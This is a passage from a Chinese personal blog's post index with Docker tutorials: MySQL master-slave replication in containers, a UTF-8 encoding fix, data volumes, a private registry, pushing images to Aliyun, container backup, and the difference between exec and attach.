-->\n\n实现效果：\n\n```bash\nroot@knight:/docker# docker images\nREPOSITORY   TAG       IMAGE ID       CREATED         SIZE\nmysql        latest    3218b38490ce   19 months ago   516MB\n```\n\n2. 生成主数据库容器\n\n```bash\ndocker run -d -p 3307:3306 \\\n--privileged=true \\\n-v /docker/mysql-master/log:/var/log/mysql \\\n-v /docker/mysql-master/data:/var/lib/mysql \\\n-v /docker/mysql-master/conf:/etc/mysql/conf.d \\\n-e MYSQL_ROOT_PASSWORD=admin \\\n--name mysql-master \\\nmysql:latest\n```\n\n具体的参数详解，可以查看[这篇文章](https://nustarain.gitee.io/2023/08/10/DockerMySQL/#more)\n\n实现效果：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                                                  NAMES\na1f6f6e03029   mysql:latest   \"docker-entrypoint.s…\"   6 seconds ago   Up 5 seconds   33060/tcp, 0.0.0.0:3307->3306/tcp, :::3307->3306/tcp   mysql-master\n```\n\n3. 添加配置文件\n\n进入`/docker/mysql-master/conf`目录，编辑配置文件`my.cnf`，插入以下内容：\n\n```bash\n[mysqld]\n## 设置server_id，同一局域网中需要唯一\nserver_id=101 \n## 指定不需要同步的数据库名称\nbinlog-ignore-db=mysql  \n## 开启二进制日志功能\nlog-bin=com-mysql-bin  \n## 设置二进制日志使用内存大小（事务）\nbinlog_cache_size=1M  \n## 设置使用的二进制日志格式（mixed,statement,row）\nbinlog_format=mixed  \n## 二进制日志过期清理时间。默认值为0，表示不自动清理。\nexpire_logs_days=7  \n## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。\n## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致\nslave_skip_errors=1062\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-master\n```\n\n5. 进入容器\n\n```bash\ndocker exec -it mysql-master /bin/bash\n```\n\n6. 授权用户\n\n进入数据库，添加授权用户。\n\n```sql\nCREATE USER 'slave'@'%' IDENTIFIED BY '123456';\nGRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'slave'@'%';\n```\n\n实现效果：\n\n```sql\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql> CREATE USER 'slave'@'%' IDENTIFIED BY '123456';\nQuery OK, 0 rows affected (0.03 sec)\n\nmysql> GRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'slave'@'%';\nQuery OK, 0 rows affected (0.02 sec)\n```\n\n7. 查看主数据库的主状态\n\n```sql\nmysql> show master status;\n+----------------------+----------+--------------+------------------+-------------------+\n| File                 | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |\n+----------------------+----------+--------------+------------------+-------------------+\n| com-mysql-bin.000001 |      156 |              | mysql            |                   |\n+----------------------+----------+--------------+------------------+-------------------+\n1 row in set (0.00 sec)\n```\n\n8. 创建从数据库容器\n\n```bash\ndocker run -d -p 3308:3306 \\\n--privileged=true \\\n-v /docker/mysql-slave/log:/var/log/mysql \\\n-v /docker/mysql-slave/data:/var/lib/mysql \\\n-v /docker/mysql-slave/conf:/etc/mysql/conf.d \\\n-e MYSQL_ROOT_PASSWORD=admin \\\n--name mysql-slave \\\nmysql:latest\n```\n\n9. 实现效果：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED              STATUS              PORTS                                                  NAMES\n06a84db29686   mysql:latest   \"docker-entrypoint.s…\"   3 seconds ago        Up 2 seconds        33060/tcp, 0.0.0.0:3308->3306/tcp, :::3308->3306/tcp   mysql-slave\na1f6f6e03029   mysql:latest   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute   33060/tcp, 0.0.0.0:3307->3306/tcp, :::3307->3306/tcp   mysql-master\n```\n\n10. 添加配置文件\n\n进入`/docker/mysql-slave/conf`目录，编辑配置文件`my.cnf`，插入以下内容：\n\n```bash\n[mysqld]\n## 设置server_id，同一局域网中需要唯一\nserver_id=102\n## 指定不需要同步的数据库名称\nbinlog-ignore-db=mysql  \n## 开启二进制日志功能，以备Slave作为其它数据库实例的Master时使用\nlog-bin=com-mysql-slave1-bin  \n## 设置二进制日志使用内存大小（事务）\nbinlog_cache_size=1M  \n## 设置使用的二进制日志格式（mixed,statement,row）\nbinlog_format=mixed  \n## 二进制日志过期清理时间。默认值为0，表示不自动清理。\nexpire_logs_days=7  \n## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。\n## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致\nslave_skip_errors=1062  \n## relay_log配置中继日志\nrelay_log=com-mysql-relay-bin  \n## log_slave_updates表示slave将复制事件写进自己的二进制日志\nlog_slave_updates=1  \n## slave设置为只读（具有super权限的用户除外）\nread_only=1\n```\n\n11. 重启容器\n\n```bash\ndocker restart mysql-slave\n```\n\n12. 在从数据库中配置主从复制\n\n进入容器\n```bash\ndocker exec -it mysql-slave /bin/bash\n```\n\n进入数据库\n\n```bash\nmysql -u root -padmin\n```\n\n开启复制功能\n\n```sql\nchange master to master_host='192.168.1.42', master_user='slave', master_password='123456', master_port=3307, master_log_file='com-mysql-bin.000001', master_log_pos=156, master_connect_retry=30;\n```\n\n上面的宿主机ip需要根据实际情况修改。\n\n主从复制参数说明：\n\n* master_host：主数据库的IP地址；\n* master_port：主数据库的运行端口；\n* master_user：在主数据库创建的用于同步数据的用户账号；\n* master_password：在主数据库创建的用于同步数据的用户密码；\n* master_log_file：指定从数据库要复制数据的日志文件，通过查看主数据的状态，获取File参数；\n* master_log_pos：指定从数据库从哪个位置开始复制数据，通过查看主数据的状态，获取Position参数；\n* master_connect_retry：连接失败重试的时间间隔，单位为秒。\n\n13. 在从数据库中开启主从同步\n\n```sql\nstart slave;\n```\n\n14. 查看从数据库状态\n\n```sql\nshow slave status \\G;\n```\n\n```sql\nmysql> show slave status \\G\n*************************** 1. row ***************************\n               Slave_IO_State: Connecting to source\n                  Master_Host: 192.168.1.42\n                  Master_User: slave\n                  Master_Port: 3307\n                Connect_Retry: 30\n              Master_Log_File: com-mysql-bin.000001\n          Read_Master_Log_Pos: 156\n               Relay_Log_File: com-mysql-relay-bin.000001\n                Relay_Log_Pos: 4\n        Relay_Master_Log_File: com-mysql-bin.000001\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n              Replicate_Do_DB: \n          Replicate_Ignore_DB: \n```\n\n15. 主从复制测试\n\n主库新建库、新建表、插入数据：\n\n```sql\ncreate database db108;\nuse db108;\ncreate table t1 (id int,name varchar(20));\ninsert into t1 values(1,'liuxp');\nselect * from t1;\n```\n\n从库查看库、查看记录，看主从同步是否成功:\n\n```sql\nshow databases;\nuse db108;\nselect * from t1;\n```","tags":["Docker","MySQL"],"categories":["技术"]},{"title":"解决Docker搭建MySQL的中文乱码问题","url":"/2023/08/10/DockerMySQL-Utf8/","content":"\n利用Docker搭建的MySQL，如果不进行额外的设置，默认是不支持在表里插入中文字符的，在实际的生产环境中，这是不允许出现的情况，要解决这个问题，主要的一个核心思想是：在容器中的`/etc/mysql/conf.d`目录下添加文件`my.cnf`。\n\n提供以下几种方法：\n\n### 方法一\n\n如果在生成容器时，使用-v 选项指定了容器和主机之间的配置文件的映射，那么直接在主机相应的目录下直接进行操作即可。\n\n<!-- more -->\n\n比如：\n\n```bash\ndocker run -d -p 3306:3306 --privileged=true -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest \n```\n\n在这个例子中，使用-v 选项将主机/docker/mysql/conf和容器的/etc/mysql/conf.d进行映射，那么直接执行：\n\n```bash\ncd /docker/mysql/conf\nvim my.cnf\n```\n\n在文件中插入：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n保存退出后重启容器：\n\n```bash\ndocker restart mysql-1\n```\n\n### 方法二\n\n在生成容器的时候没有进行配置文件目录的映射：\n\n1. 进入容器：\n\n```bash\ndocker exec -it mysql-1 /bin/bash\n```\n\n2. 下载软件包vim\n\n此时，我们的目的是向`/etc/mysql/conf.d`目录下添加`my.cnf`配置文件，但是目前容器中并不存在vim软件包，下载软件包可以参考[这篇文章](https://nustarain.gitee.io/2023/08/09/ContainerDownloadSoft/)。\n\n也可以直接执行下面的命令：\n\n```bash\napt-get update\napt install -y vim\n```\n\n3. 等待安装完成后\n\n```bash\ncd /etc/mysql/conf.d\nvim my.cnf\n```\n\n在文件中插入：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-1\n```\n\n### 方法三\n\n1. 在主机本地编辑文件`my.cnf`。\n\n2. 插入内容：\n\n```bash\n[client]\ndefault_character_set = utf8\n[mysqld]\ncollation_server = utf8_general_ci\ncharacter_set_server = utf8\n```\n\n3. 拷贝文件至容器\n\n```bash\ndocker cp mysql-1 ./my.cnf /etc/mysql/conf.d\n```\n\n4. 重启容器\n\n```bash\ndocker restart mysql-1\n```\n\n### 检查配置文件是否生效\n\n进入容器，进入数据库，输入：\n\n```bash\nSHOW VARIABLES LIKE 'character%';\n```\n\n回车出现以下，修改成功：\n\n```bash\nmysql> SHOW VARIABLES LIKE 'character%';\n+--------------------------+--------------------------------+\n| Variable_name            | Value                          |\n+--------------------------+--------------------------------+\n| character_set_client     | utf8mb3                        |\n| character_set_connection | utf8mb3                        |\n| character_set_database   | utf8mb3                        |\n| character_set_filesystem | binary                         |\n| character_set_results    | utf8mb3                        |\n| character_set_server     | utf8mb3                        |\n| character_set_system     | utf8mb3                        |\n| character_sets_dir       | /usr/share/mysql-8.0/charsets/ |\n+--------------------------+--------------------------------+\n8 rows in set (0.00 sec)\n```","tags":["Docker","MySQL"],"categories":["技术"]},{"title":"利用Docker搭建MySQL服务器（实战版）","url":"/2023/08/10/DockerMySQL/","content":"\n\n\n### 操作步骤\n\n1. 拉取镜像\n\n```bash\ndocker pull mysql\n```\n\n<!-- more -->\n\n2. 生成容器\n\n```bash\ndocker run -d -p 3306:3306 --privileged=true -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest \n```\n\n* -d 后台运行\n\n* -p 端口映射，将本机的3306，映射为容器的3306端口，需要注意的是，如果本机已经装了MySQL，本机3306端口已经被占用的话，需要改变监听的端口。\n\n* -v /docker/mysql/log:/var/log/mysql 数据库服务的日志目录映射\n\n* -v /docker/mysql/data:/var/lib/mysql 数据库服务的数据库数据映射\n\n* -v /docker/mysql/conf:/etc/mysql/conf.d 数据库服务的配置文件映射\n\n* -e 指定数据库服务的密码\n\n* --name 指定容器名称\n\n3. 验证生成\n\n```bash\ndocker ps\n```\n\n4. 进入容器\n\n```bash\ndocker exec -it mysql-1 /bin/bash\n```\n\n5. 进入数据库\n\n```bash\nmysql -u root -padmin\n```\n\n* -p 输入生成容器时设置的密码，-p和密码之间不能有空格","tags":["Docker","MySQL"],"categories":["学习过程"]},{"title":"Docker数据卷详解","url":"/2023/08/10/DockerVolume/","content":"\n### 数据卷介绍\n\n容器数据卷(Container Volumes)是Docker用于持久化和共享容器数据的一种机制。它允许您在容器之间共享文件/文件夹,并且对容器生命周期之外的数据进行持久化存储。\n\n主要特点包括:\n\n- 数据共享 - 容器之间可以通过数据卷来共享数据。多个容器可以同时挂载一个数据卷,实现数据共享。\n\n<!-- more -->\n\n- 数据持久化 - 数据卷的生命周期独立于容器,即使容器被删除,数据卷中的数据也不会丢失。\n\n- 数据加密 - 可以对 Docker 数据卷内容进行加密,保证数据安全性。\n\n- 性能优势 - 容器绕过 Union File System,可以直接操作数据卷,提高IO性能。\n\n- 挂载宿主目录 - 可以将宿主机上的目录作为数据卷挂载到容器中,实现容器访问宿主机文件。\n\n使用数据卷的场景包括需要保存容器数据、需要在容器之间共享文件、需要备份、恢复或迁移数据等。总之,容器数据卷为容器提供了持久化存储和数据共享能力。\n\n### 简单使用\n\n```bash\ndocker run -d -p 6603:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7\n```\n\n使用-v选项来对主机目录和容器内的目录进行映射，使用冒号间隔。\n\n映射后，从无论是主机部分新建的文件，还是容器内新建的文件，都可以实时在映射对方实现互通有无。\n\n### 常用命令\n\n1. 删除数据卷\n\n```bash\ndocker volume create my-vol\n```\n\n2. 查看所有的数据卷\n\n```bash\ndocker volume ls\n```\n\n3. 查看指定数据卷的信息\n\n```bash\ndocker volume inspect my-vol\n```\n\n4. 删除数据卷\n\n```bash\ndocker volume rm my-vol\n```\n\n5. 清理无主的数据卷\n\n```bash\ndocker volume prune\n```\n\n6. 使用 --mount创建数据卷\n\n挂载一个主机目录作为数据卷。使用 --mount 标记可以指定挂载一个本地主机的目录到容器中去。\n\n```bash\ndocker run -d --name test \\\n    --mount type=bind,source=/host/path,target=/container/path \\\n    nginx:latest\n```\n\n这个例子中,会将主机路径 /host/path 挂载到容器内的 /container/path,实现在主机和容器之间共享这个目录。\n\n另一个例子:\n\n```bash\ndocker run -d --name test \\\n   --mount type=bind,source=$(pwd)/config.json,target=/app/config.json \\\n   myapp:latest\n```\n\n这将主机当前目录下的 config.json 文件挂载到容器的 /app/config.json。挂载单个文件作为数据卷,提供一种配置注入的方式。\n\n总之,--mount 参数提供了一个在 docker run 时直接挂载主机目录的简便方法,避免了使用额外的 docker volume 命令。\n\n### 具名挂载和匿名挂载\n\n具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)是Docker中的两种数据卷方式。\n\n具名挂载:\n\n需要通过docker volume create命令显式地创建。\n卷的名称可以被用户自定义。\n生命周期独立于容器,容器删除后卷仍然存在。\n可以被多个容器同时挂载使用。\n\n匿名挂载:\n\n在docker run命令中通过-v参数隐式创建。\n名称随机生成,用户不可自定义。\n生命周期依赖于容器,容器删除后匿名卷也会被删除。\n仅供一个容器专有使用。\n\n具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)都是Docker的数据卷,主要区别如下:\n\n1. 定义方式不同\n\n具名挂载需要通过docker volume create命令显式创建。\n匿名挂载可以通过docker run命令隐式创建。\n\n2. 生命周期不同\n\n具名挂载的生命周期独立于容器,容器删除后卷仍然存在。\n匿名挂载的生命周期和容器一致,容器删除后匿名卷也会被删除。\n\n3. 使用方式不同\n\n具名挂载可以被多个容器同时挂载使用。\n匿名挂载仅供一个容器专有使用。\n\n例子：\n\n具名挂载:\n\n```bash\ndocker volume create my-vol\ndocker run -v my-vol:/opt container\n```\n\n匿名挂载:\n\n```bash\ndocker run -v /opt container\n```\n\n上面在运行容器时分别使用了具名挂载my-vol和匿名挂载/opt,它们的生命周期和作用范围不同。\n\n### 数据卷的共享\n\n--volumes-from参数可以实现Docker容器之间的数据卷共享。\n\n其作用是将指定容器挂载的数据卷,挂载到当前容器中,实现多容器间的卷共享。\n\n例如:\n\n1. 创建一个命名为 vol1 的数据卷\n\n```bash\n# 容器dbdata挂载名为dbvol的数据卷 \ndocker run -d --name dbdata -v dbvol:/dbdata mysql\n\n# 容器webapp使用--volumes-from来挂载dbdata中的数据卷\ndocker run -d --name webapp --volumes-from dbdata nginx\n```\n\n上面通过--volumes-from dbdata,实现了容器webapp继承容器dbdata的卷挂载配置。webapp也可以访问dbvol的数据卷了。\n\n需要注意的是,--volumes-from Parameters会继承前容器所有卷的挂载配置,包括匿名和具名的。\n\n如果仅想共享指定的命名卷,可以用--volumes-from加上容器名称和卷名的组合实现,例如:\n\n```bash\n--volumes-from dbdata:dbvol\n```","tags":["Docker"],"categories":["学习过程"]},{"title":"Docker镜像推送到私有仓库","url":"/2023/08/09/DockerPushLocal/","content":"\n在实际的生产条件中，公司会用到涉及公司内部的资料，并不希望将镜像挂在公共的仓库，那就需要一个私有的容器仓库来存放打包的镜像，本节记录如何创建本地私有镜像仓库，并上传下载镜像。\n\n1. 拉取镜像\n\n执行以下命令：\n\n```bash\ndocker pull registry\n```\n\n<!-- more -->\n\n2. 运行容器\n\n下载完镜像之后同样需要先把镜像运行起来，执行下面的命令：\n\n```bash\ndocker run -d -p 5000:5000 -v /docker/registry/:/tmp/registry --privileged=true --name registry-1 registry\n```\n\n* -d 守护进程运行（后台运行）\n\n* -v 数据卷映射，把本地的`/docker/registry/`映射为容器的`/tmp/registry`。\n\n* --privileged=true，container内的root拥有真正的root权限。具体解释参考[这篇文章](https://blog.csdn.net/wangxuelei036/article/details/107457712)。\n\n* --name 指定容器的名字，不设置会由系统随机分配一个。\n\n3. 测试仓库可用性\n\n当前我电脑的IP为：192.168.1.42。\n\n```bash\ncurl -XGET http://192.168.1.42:5000/v2/_catalog\n```\n\n下面的例子可以看到当前本地私有仓库中并没有任何的镜像，出现`{\"repositories\":[]}`,表示本地私有仓库可用。\n\n```bash\nroot@knight:/# curl -XGET http://192.168.1.42:5000/v2/_catalog\n{\"repositories\":[]}\n```\n\n4. 生成镜像\n\n更新一个镜像，并重新commit生成一个镜像，具体生成镜像的方法可以参考[这篇文章](https://nustarain.gitee.io/2023/08/09/ContainerCommit/)\n\n比如，我利用mynginx:1.0重新生成了版本号为1.1的mynginx镜像：\n\n```bash\nroot@knight:/# docker commit -m \"add net-tools package\" -a \"lxp\" nginx-1 mynginx:1.1\nsha256:f35ce030ad1119c6fe4a1398386048ad51471e80a672c55912b46f157d1554c2\nroot@knight:/# docker images\nREPOSITORY       TAG       IMAGE ID       CREATED          SIZE\nmynginx          1.1       f35ce030ad11   11 seconds ago   198MB\nmynginx          1.0       ff65638c821e   5 hours ago      196MB\n```\n\n5. 更改镜像名称\n\n上传到本地私有仓库需要满足一定的镜像名称上传规范，需要对mynginx:1.1进行改名：\n\n当前我电脑的IP为：192.168.1.42。\n\n```bash\ndocker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1\n```\n\n效果如下：\n\n```bash\nroot@knight:/# docker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1 \nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED          SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   13 minutes ago   198MB\nmynginx                     1.1       f35ce030ad11   13 minutes ago   198MB\nmynginx                     1.0       ff65638c821e   5 hours ago      196MB\n```\n\n可以看出，修改tag之后，并不是将原来的镜像直接更名，而是克隆出一个更名的镜像。\n\n6. 修改配置文件\n\n在docker中默认不支持http协议，所以需要我们手动修改配置文件，以支持http协议。\n\n例：\n\n```bash\nroot@knight:/# cat /etc/docker/daemon.json \n{\n  \"registry-mirrors\": [\"https://az7a5oso.mirror.aliyuncs.com\"],\n  \"insecure-registries\": [\"192.168.1.42:5000\"]\n}\n```\n\n* registry-mirrors 是加速用的。\n\n* insecure-registries 是开启http协议的。\n\n配置完成后如果不生效，尝试`systemctl daemon-reload`。\n\n如果还是不行，尝试`systemctl restart docker`，实际生产环境中，很少会直接重启docker，因为重启后，所有的容器都会停止，所以这条命令一定要放在最后。\n\n如果重启了docker，不要忘记步骤2，重新运行容器。\n\n7. 上传到私有仓库\n\n```bash\ndocker push 192.168.1.42:5000/mynginx:1.1 \n```\n\n例子：\n\n```bash\nroot@knight:/# docker push 192.168.1.42:5000/mynginx:1.1 \nThe push refers to repository [192.168.1.42:5000/mynginx]\n0033c6e89448: Pushed \nd874fd2bc83b: Pushed \n32ce5f6a5106: Pushed \nf1db227348d0: Pushed \nb8d6e692a25e: Pushed \ne379e8aedd4d: Pushed \n2edcec3590a4: Pushed \n1.1: digest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4 size: 1782\n```\n\n8. 验证仓库镜像\n\n```bash\nroot@knight:/# curl -XGET http://192.168.1.42:5000/v2/_catalog\n{\"repositories\":[\"mynginx\"]}\n```\n\n可以看到现在仓库中已经存在“mynginx”的镜像了。\n\n9. PULL到本地使用\n\n```\ndocker pull 192.168.1.42:5000/mynginx:1.1\n```\n\n例子：\n\n```bash\nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED             SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB\nmynginx                     1.1       f35ce030ad11   About an hour ago   198MB\nnginx                       latest    605c77e624dd   19 months ago       141MB\nregistry                    latest    b8604a3fe854   21 months ago       26.2MB\nroot@knight:/# docker rmi 192.168.1.42:5000/mynginx:1.1 \nUntagged: 192.168.1.42:5000/mynginx:1.1\nUntagged: 192.168.1.42:5000/mynginx@sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4\nroot@knight:/# docker images\nREPOSITORY   TAG       IMAGE ID       CREATED             SIZE\nmynginx      1.1       f35ce030ad11   About an hour ago   198MB\nnginx        latest    605c77e624dd   19 months ago       141MB\nregistry     latest    b8604a3fe854   21 months ago       26.2MB\nroot@knight:/# docker pull 192.168.1.42:5000/mynginx:1.1\n1.1: Pulling from mynginx\nDigest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4\nStatus: Downloaded newer image for 192.168.1.42:5000/mynginx:1.1\n192.168.1.42:5000/mynginx:1.1\nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED             SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB\nmynginx                     1.1       f35ce030ad11   About an hour ago   198MB\nnginx                       latest    605c77e624dd   19 months ago       141MB\nregistry                    latest    b8604a3fe854   21 months ago       26.2MB\n```","tags":["Docker"],"categories":["学习过程"]},{"title":"Docker镜像推送到阿里云","url":"/2023/08/09/DockerPushAliyun/","content":"\n在自己本地生产需要的Docker镜像，只留在本地只能供自己使用，而在团队协作的过程中，更多的要发挥文件共享的优势，那么就需要把Docker镜像推送到远端仓库，作为一个共享的资源。Docker Hub 确实是一个不错的工具，但是作为国内用户来讲，不是很友好，那么在阿里云迅猛发展的今天，也给我们提供了不错的解决方案。所以，最后决定把阿里云仓库作为docker镜像的选择。\n\n### 操作步骤\n\n1. 需要拥有一个阿里云旗下的一个账号，支付宝，淘宝等等都可以。浏览器搜索`aliyun.com`。\n\n<!-- more -->\n\n2. 登录完成后，进入容器镜像服务。\n\n![登录](./DockerPushAliyun/1.png)\n\n3. 实例列表选择个人版，进入后创建命名空间。\n\n![登录](./DockerPushAliyun/2.png)\n\n4. 然后创建镜像仓库。\n\n![登录](./DockerPushAliyun/3.png)\n\n5. 创建完成后，点击镜像仓库右侧的管理。\n\n![登录](./DockerPushAliyun/4.png)\n\n6. 这里面是可能会用到的命令。\n\n![登录](./DockerPushAliyun/5.png)\n\n7. 附上自己的仓库，纯粹为了方便自己。\n\n* 登录阿里云Docker Registry：\n\n```bash\ndocker login --username=knight731 registry.cn-hangzhou.aliyuncs.com\n```\n\n* 从Registry中拉取镜像:\n\n```bash\ndocker pull registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```\n\n* 将镜像推送到Registry:\n\n```bash\ndocker login --username=knight731 registry.cn-hangzhou.aliyuncs.com\n```\n\n```bash\ndocker tag [ImageId] registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```\n \n```bash\ndocker push registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[镜像版本号]\n```","tags":["Docker"],"categories":["学习过程"]},{"title":"将更改过的容器导出为镜像","url":"/2023/08/09/ContainerCommit/","content":"\n执行命令：\n\n```bash\ndocker commit -m \"add vim package\" -a \"liuxp\" 容器ID 容器名:版本号\n```\n\n* -m 添加提交描述。\n\n* -a 指明提交人。 ","tags":["Docker"],"categories":["学习过程"]},{"title":"容器中下载软件包","url":"/2023/08/09/ContainerDownloadSoft/","content":"\n每个容器都相当于一台单独linux机器。也正因为容器的轻便型，部署好容器后，非常多的软件都是不存在的，需要自己按需下载。\n\n一般的步骤是：\n\n1. 执行命令：\n\n```bash\napt-get update\n```\n\n2. 等待软件包缓存更新完毕，执行下载命令，比如：\n\n```bash\napt install -y vim\n```","tags":["Docker"],"categories":["学习过程"]},{"title":"Docker重要数据备份","url":"/2023/08/08/DockerBackup/","content":"\n生产环境中，免不了会出现一些误操作，导致Docker开发重要文件或者数据的丢失，那么做好重要数据的备份是免不了的。主要就是重要的配置文件，甚至已经生成的重要的容器，后者更简单粗暴。\n\n### 拷贝容器的配置文件\n\n```bash\ndocker cp 容器ID:/tmp/a.txt /home/admin\n```\n\n例子：\n\n<!-- more -->\n\n将nginx-1容器的NGINX配置文件拷贝到当前目录下\n\n```bash\nroot@knight:/docker/nginx# ls\nroot@knight:/docker/nginx# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1    \"/bin/bash\"              44 minutes ago   Up 25 minutes             nginx-1\nroot@knight:/docker/nginx# docker cp nginx-1:/etc/nginx/nginx.conf ./\nroot@knight:/docker/nginx# ls\nnginx.conf\nroot@knight:/docker/nginx# \n```\n\n### 容器的导入与导出\n\n导出容器（默认是导出到当前目录下）：\n\n```bash\ndocker export 容器ID > xxx.tar\n```\n\n例子：\n\n```bash\nroot@knight:/docker# ls\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1    \"/bin/bash\"              51 minutes ago   Up 31 minutes             nginx-1\nroot@knight:/docker# docker export nginx-1 > nginx-1.tar\nroot@knight:/docker# ls\nnginx-1.tar\nroot@knight:/docker# \n```\n\n导入容器：\n\n```bash\ncat xxx.tar | docker import - [用户名/]镜像名:版本号\n```\n\n例子：\n\n导入nginx-1.tar这个容器\n\n```bash\nroot@knight:/docker# ls\nnginx-1.tar\nroot@knight:/docker# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED         SIZE\nroot@knight:/docker# cat nginx-1.tar | docker import - knight/nginx-1:0.1\nsha256:f82cc108516521700a6d74e03e26be639131a5d361c66b50f923ba00a1df8fe3\nroot@knight:/docker# docker images\nREPOSITORY       TAG       IMAGE ID       CREATED         SIZE\nknight/nginx-1   0.1       f82cc1085165   4 seconds ago   140MB\nroot@knight:/docker# \n```","tags":["Docker"],"categories":["学习过程"]},{"title":"两种进入和退出容器的方法以及它们之间的区别","url":"/2023/08/08/ExitContainer/","content":"\n### 进入容器的两种方法\n\n两种进入容器的方法分别是使用`exec`he`attach`两种方法。\n\n具体如下：\n\n* 使用`exec`的方式\n\n```bash\ndocker exec -it nginx-1 /bin/bash\n```\n\n* 使用`attach`的方式\n\n<!-- more -->\n\n```bash\ndocker attach nginx-1\n```\n\n### 进入容器两种方法的区别\n\n从下面的例子来看这两种进入容器的区别：\n\n```bash\nroot@knight:/docker# docker ps \nCONTAINER ID   IMAGE         COMMAND       CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1   \"/bin/bash\"   21 seconds ago   Up 20 seconds             nginx-1\nroot@knight:/docker# docker exec -it nginx-1 /bin/bash\nroot@c2dbddec15d3:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND       CREATED         STATUS         PORTS     NAMES\nc2dbddec15d3   mynginx:0.1   \"/bin/bash\"   2 minutes ago   Up 2 minutes             nginx-1\nroot@knight:/docker# docker attach nginx-1\nroot@c2dbddec15d3:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES\nroot@knight:/docker# \n```\n\n可以观察到以下几点区别：\n\n1. 进入容器的命令指定的参数不一样，exec更复杂一点，需要指定一些参数。\n\n2. 使用exec进去的容器，exit退出之后，容器仍然运行，但是使用attach进入的容器，exit退出之后，容器直接停止了。\n\n原因如下：\n\n1. exec在进入容器时，会在容器里额外打开一个bash，当退出时，会停用当前的这个bash，也就是说，容器中还会有之前的bash在运行，有bash就有进程，有进程就不会停止容器。这也就是为什么exec在进入容器时，要指定一个解释器的原因。\n\n2. 使用attach进入容器时，会直接进入容器当前存在的bash(解释器)，而不会打开新的解释器，而在退出的时候，则会关闭唯一存在的解释器，也就是说容器没有存在的进程了，容器就认为自己没有存在的价值了，就会自己停止。\n\n### 退出容器的两种方法\n\n玩容器比较少的可能只知道退出容器的方法只有`exit`命令，但是在容器退出的时候其实还有<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>方式退出。\n\n### 退出容器的两种方法的区别\n\n退出容器的区别有一个前提是构建这个容器的时候，没有指定-d选项。否则设置后台运行是没有任何区别的。\n\n从下面的例子来看这两种退出容器的区别：\n\n```bash\nroot@knight:/docker# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED             SIZE\nmynginx       0.1       babef9096509   About an hour ago   140MB\nnginx         latest    605c77e624dd   19 months ago       141MB\nhello-world   latest    feb5d9fea6a5   22 months ago       13.3kB\nroot@knight:/docker# docker run -it --name nginx-2 nginx:latest /bin/bash\nroot@634746a9bd08:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND       CREATED          STATUS         PORTS     NAMES\nroot@knight:/docker# docker run -it --name nginx-3 nginx:latest /bin/bash\nroot@29ce1f7749cb:/# root@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS         PORTS     NAMES\n29ce1f7749cb   nginx:latest   \"/docker-entrypoint.…\"   9 seconds ago    Up 8 seconds   80/tcp    nginx-3\nroot@knight:/docker# \n```\n\n可以观察到：\n\n1. 